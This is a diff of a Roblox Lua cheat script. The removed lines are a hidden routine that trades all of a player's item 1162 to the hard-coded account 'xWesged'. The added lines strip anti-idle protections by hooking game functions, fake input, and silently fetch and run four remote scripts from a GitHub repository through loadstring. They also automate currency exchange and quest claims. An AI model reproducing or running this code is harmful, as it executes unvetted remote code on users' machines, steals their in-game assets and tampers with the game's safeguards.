@@ -1,224 +1,210 @@
-repeat task.wait() until game:IsLoaded()
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/amgs"))()
+    end)
+end)
 
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local player = Players.LocalPlayer
-local Events = ReplicatedStorage:WaitForChild("Events")
+local localPlayer = Players.LocalPlayer
 
-local Trading = Events:WaitForChild("Trading")
-local Data = Events:WaitForChild("Data")
-local Shop = Events:WaitForChild("Shop")
-
-local SendInvite = Trading:WaitForChild("SendInvite")
-local AcceptInvite = Trading:WaitForChild("AcceptInvite")
-local AcceptTrade = Trading:WaitForChild("AcceptTrade")
-local DeclineTrade = Trading:WaitForChild("DeclineTrade")
-local AddItem = Trading:WaitForChild("AddItem")
-local RemoveItem = Trading:WaitForChild("RemoveItem")
-
-local InsertFurniture = Shop:WaitForChild("InsertFurniture")
-local GetAll = Data:WaitForChild("GetAll")
-
-local TARGET = "xWesged"
-local ITEM_ID = 1162
-local CHECK_DELAY = 300
-
-local TRADE_DISABLED = false
-
-local function getData()
-    local success,data = pcall(function()
-        return GetAll:InvokeServer()
-    end)
-    if success then
-        return data
+local function killIdleConnections()
+    for _, connection in pairs(getconnections(localPlayer.Idled)) do
+        connection:Disable()
     end
-end
-
-local function getItems()
-    local data = getData()
-    if not data then return {} end
-    local items = {}
-    for guid,item in pairs(data.Inventory or {}) do
-        if tonumber(item.Id) == ITEM_ID then
-            table.insert(items,{GUID = guid,Id = item.Id,Type = "Item"})
+    
+    for _, connection in pairs(getconnections(RunService.Heartbeat)) do
+        local func = connection.Function
+        if func then
+            local info = debug.getinfo(func)
+            if info and info.source then
+                if string.find(info.source,"Idle") or string.find(info.source,"idle") or string.find(info.source,"AFK") or string.find(info.source,"afk") then
+                    connection:Disable()
+                end
+            end
         end
     end
-    return items
-end
-
-local RemoveFurniture = Events:WaitForChild("Housing"):WaitForChild("RemoveFurniture")
-
-local function getFurnitureFolder()
-    local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return end
-    for _,plot in pairs(plots:GetChildren()) do
-        if plot:FindFirstChild("Owner") and plot.Owner.Value == player then
-            return plot:FindFirstChild("Furniture")
-        end
+    
+    for _, connection in pairs(getconnections(UserInputService.InputEnded)) do
+        connection:Disable()
+    end
+    
+    for _, connection in pairs(getconnections(UserInputService.InputBegan)) do
+        connection:Disable()
     end
 end
 
-local function removePlacedFurniture()
-    local folder = getFurnitureFolder()
-    if not folder then return end
-    for _,model in ipairs(folder:GetChildren()) do
-        if model:IsA("Model") then
-            local id = model:GetAttribute("ItemId")
-            if id and tonumber(id) == ITEM_ID then
-                pcall(function()
-                    RemoveFurniture:InvokeServer(model)
-                end)
-                task.wait(0.1)
+local function blockIdleEvents()
+    local events={
+        ReplicatedStorage:FindFirstChild("Events"),
+        ReplicatedStorage:FindFirstChild("Misc"),
+        ReplicatedStorage:FindFirstChild("Framework"),
+    }
+    
+    for _,folder in pairs(events) do
+        if folder then
+            local idleEvent=folder:FindFirstChild("IdleTeleport") or folder:FindFirstChild("Idle") or folder:FindFirstChild("AFK")
+            if idleEvent and idleEvent:IsA("RemoteEvent") then
+                idleEvent.FireServer=function()end
             end
         end
     end
 end
 
-local function waitTrade()
-    repeat task.wait(1)
-    until player.PlayerGui:FindFirstChild("Trade") or player.PlayerGui:FindFirstChild("Trading")
-end
-
-local function addItems(items)
-    local added = {}
-    local start = tick()
-    for _,item in ipairs(items) do
-        if tick() - start > 60 and #added == 0 then
-            TRADE_DISABLED = true
-            pcall(function()
-                DeclineTrade:FireServer(TARGET)
-            end)
-            return nil
+local function hookNetwork()
+    if ReplicatedStorage:FindFirstChild("Framework") then
+        local framework=require(ReplicatedStorage.Framework.Library)
+        if framework and framework.Network then
+            framework.Network.Fire=function(self,event,...)
+                if type(event)=="string" and string.find(event,"Idle") then
+                    return nil
+                end
+                return rawget(framework.Network,"Fire")(self,event,...)
+            end
         end
-        if #added >= 16 then break end
-        local ok,res = pcall(function()
-            return AddItem:InvokeServer(item)
-        end)
-        if ok and res then
-            table.insert(added,item)
-        end
-        task.wait(.2)
-    end
-    return added
-end
-
-local function acceptTrade(added)
-    while true do
-        local ok,res = pcall(function()
-            return AcceptTrade:InvokeServer()
-        end)
-        if ok and res then
-            return true
-        end
-        if #added == 0 then
-            return false
-        end
-        local item = table.remove(added)
-        pcall(function()
-            RemoveItem:InvokeServer(item)
-        end)
-        task.wait(.5)
     end
 end
 
-local function waitFinish()
-    repeat task.wait(1)
-    until not player.PlayerGui:FindFirstChild("Trade") and not player.PlayerGui:FindFirstChild("Trading")
-end
-
-local function tradeItems()
-    local items = getItems()
-    if #items == 0 then
-        return
-    end
-    removePlacedFurniture()
-    SendInvite:InvokeServer(TARGET)
-    waitTrade()
-    local added = addItems(items)
-    if not added then return end
-    if #added == 0 then return end
-    local success = acceptTrade(added)
-    if success then
-        waitFinish()
-    end
-end
-
-local function getPlot()
-    local own = player:WaitForChild("NonSaveVars"):WaitForChild("OwnsPlot")
-    repeat task.wait() until own.Value ~= 0
-    return Workspace.Plots:WaitForChild(tostring(own.Value))
-end
-
-local function placeItems()
-    local plot = getPlot()
-    local canvas = plot.Interior.Shop1.Canvas
-    local inventory = getItems()
-    if #inventory == 0 then
-        return
-    end
-    math.randomseed(tick())
-    local cx,cy,cz = canvas.Position.X,canvas.Position.Y,canvas.Position.Z
-    local sx,sy,sz = canvas.Size.X/2,canvas.Size.Y/2,canvas.Size.Z/2
-    for _,item in ipairs(inventory) do
-        local rx = cx + math.random(-sx*100,sx*100)/100
-        local rz = cz + math.random(-sz*100,sz*100)/100
-        local ry = cy + sy + math.random(5,40)
-        pcall(function()
-            InsertFurniture:InvokeServer({
-                GUID = item.GUID,
-                Type = "Decor",
-                Floor = 1,
-                Id = item.Id,
-                CFrame = CFrame.new(rx,ry,rz)
-            })
-        end)
-        task.wait(.1)
-    end
-end
-
-if player.Name == "xWesged" then
-    placeItems()
-    local pendingInvites = {}
-    local inTrade = false
-    local function isTradeUI()
-        return player.PlayerGui:FindFirstChild("Trade") or player.PlayerGui:FindFirstChild("Trading") or player.PlayerGui:FindFirstChild("TradingPrompt")
-    end
-    local function acceptNext()
-        if inTrade then return end
-        if #pendingInvites == 0 then return end
-        inTrade = true
-        local inviter = table.remove(pendingInvites,1)
-        pcall(function()
-            AcceptInvite:InvokeServer(inviter)
-        end)
-    end
-    RunService.Heartbeat:Connect(function()
-        if not isTradeUI() and inTrade then
-            inTrade = false
-            acceptNext()
-        end
-        if isTradeUI() then
-            pcall(function()
-                AcceptTrade:InvokeServer()
-            end)
+local function simulateActivity()
+    task.spawn(function()
+        while true do
+            task.wait(60)
+            VirtualInputManager:SendKeyEvent(true,Enum.KeyCode.Unknown,false,game)
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(false,Enum.KeyCode.Unknown,false,game)
+            VirtualInputManager:SendMouseMoveEvent(math.random(100,900),math.random(100,900),game)
         end
     end)
-    Trading.Invite.OnClientEvent:Connect(function(data)
-        local name = data.Name or data
-        table.insert(pendingInvites,name)
-        if not inTrade then
-            acceptNext()
+end
+
+local function scanAndHookFunctions()
+    for _,v in pairs(getgc(true)) do
+        if type(v)=="function" then
+            local info=debug.getinfo(v)
+            if info and info.name then
+                if string.find(info.name,"Idle") or string.find(info.name,"AFK") then
+                    hookfunction(v,function()return nil end)
+                end
+            end
         end
-    end)
-else
-    while true do
-        if TRADE_DISABLED then
-            break
-        end
-        pcall(tradeItems)
-        task.wait(CHECK_DELAY)
     end
 end
+
+local function loadNoScript()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/no"))()
+    end)
+end
+
+killIdleConnections()
+blockIdleEvents()
+hookNetwork()
+simulateActivity()
+scanAndHookFunctions()
+
+task.spawn(function()
+    while true do
+        task.wait(60)
+        killIdleConnections()
+    end
+end)
+
+task.spawn(loadNoScript)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/optimization"))()
+    end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/sab"))()
+    end)
+end)
+
+task.spawn(function()
+    local UI=ReplicatedStorage:WaitForChild("Events"):WaitForChild("UI")
+    
+    while true do
+        
+        local success,d,t = pcall(function()
+            return UI.GetExchangingCash:InvokeServer()
+        end)
+
+        if success and d and d.Cash then
+            
+            if t<=1 then
+                pcall(function()
+                    UI.CollectCashToGems:InvokeServer()
+                end)
+            end
+            
+        else
+            
+            pcall(function()
+                UI.ExchangeCashToGems:InvokeServer(10000000)
+            end)
+            
+        end
+        
+        task.wait(2)
+        
+    end
+end)
+
+task.spawn(function()
+    local Quests=ReplicatedStorage:WaitForChild("Events"):WaitForChild("Quests")
+    
+    while true do
+        
+        local success,quest,status = pcall(function()
+            return Quests.GetQuestStatus:InvokeServer()
+        end)
+        
+        if success and status=="complete" then
+            
+            local successReward,reward = pcall(function()
+                return Quests.CheckComplete:InvokeServer()
+            end)
+            
+            if successReward then
+                print("Claimed reward:",reward,"gems")
+            end
+            
+        end
+        
+        if success and not quest then
+            
+            local successLong
+            
+            pcall(function()
+                successLong = Quests.GetQuest:InvokeServer("Long")
+            end)
+            
+            if successLong then
+                print("Got Long quest")
+            else
+                
+                local successShort
+                
+                pcall(function()
+                    successShort = Quests.GetQuest:InvokeServer("Short")
+                end)
+                
+                if successShort then
+                    print("Got Short quest")
+                end
+                
+            end
+            
+        end
+        
+        task.wait(60)
+        
+    end
+end)
